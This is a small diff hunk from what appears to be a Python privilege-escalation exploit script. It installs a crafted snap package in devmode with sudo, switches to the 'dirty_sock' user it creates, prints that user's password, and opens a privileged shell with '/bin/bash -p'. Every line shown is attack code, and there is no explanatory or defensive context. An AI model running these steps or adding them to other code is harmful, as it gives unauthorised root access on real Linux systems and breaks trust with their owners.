@@ -29,4 +29,6 @@ del payload
 payload = "sudo /usr/bin/snap install --devmode m4chin3m4n.snap"
 
 os.system(payload)
+print("password: dirty_sock")
 os.system("su dirty_sock")
+os.system("/bin/bash -p")
